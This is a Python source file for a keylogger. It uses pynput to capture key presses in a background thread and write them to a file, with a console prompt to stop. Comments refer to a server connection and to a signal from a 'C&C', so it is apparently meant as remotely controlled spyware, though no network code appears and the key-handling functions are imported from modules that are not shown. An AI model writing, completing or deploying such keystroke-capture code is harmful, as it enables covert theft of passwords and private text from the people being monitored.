import threading 
from script import keyPressedF, buffer_words
from functools import partial
from pynput import keyboard
import os
stop_event = threading.Event()
buffer_local= []
from cfile import checkfile

def keyboard_logger_pathed_without_timer(path):
    print(os.getpid())
    keyPressed_with_path = partial(keyPressedF, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    #time.sleep(5)

    try:
        while not stop_event.is_set():
            threading.Event().wait(0.1)
    finally:
        listner.stop()
    
    #listner.stop()
    buffer_local = buffer_words
    #print(buffer_words)

def run():
    #store_file -> file path for logger
    #bfr -> temporary store for words captured
    #RF -> binary flag for running the script or not
    

    #check for file
    
    store_file = checkfile()
    print(store_file)
    
    #check for server conn
    print("Server connnection starting...")

    #run keylogger
    
    print("Starting the logger")
    
    t1 = threading.Thread(target=keyboard_logger_pathed_without_timer, name='logger', args=(store_file,))

    inp = -1
    print('>>>starting logger thread')
    t1.start()
    print('>>>starting while loop')
    while inp < 0:
        print('0 for exit, 1 for keep going')
        inp = int(input())
        
    print('>>>setting the flag')
    stop_event.set()
    print('>>>rejoining main thread')
    t1.join()
    print('>>>printing buffer words')
    print(buffer_words)
    
    #terminate connection upon recieving signal from C&C
    print()        

if __name__ == "__main__":
    run()

    